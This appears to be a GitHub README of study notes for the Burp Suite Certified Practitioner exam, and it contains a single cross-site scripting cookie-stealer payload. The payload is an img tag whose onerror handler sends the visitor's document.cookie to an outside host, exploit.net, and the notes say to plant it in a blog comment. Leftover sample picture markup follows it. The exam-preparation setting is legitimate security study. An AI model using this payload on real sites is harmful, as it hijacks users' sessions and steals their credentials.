`#0d1117`
# Burp-Suite-Certified-Practitioner-Exam-Study
Burp Suite Certified Practitioner Exam Study Notes

## Cross Site Scripting

### Cookie Stealers

**Place payload in blog post comment section for victim to visit and send cookie.**
```html
<img src="1" onerror="window.location='http://exploit.net/cookie='+document.cookie">
```
<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://user-images.githubusercontent.com/25423296/163456776-7f95b81a-f1ed-45f7-b7ab-8fa810d529fa.png">
  <source media="(prefers-color-scheme: light)" srcset="https://user-images.githubusercontent.com/25423296/163456779-a8556205-d0a5-45e2-ac17-42d089e3c3f8.png">
  <img alt="Shows an illustrated sun in light mode and a moon with stars in dark mode." src="https://user-images.githubusercontent.com/25423296/163456779-a8556205-d0a5-45e2-ac17-42d089e3c3f8.png">
</picture>
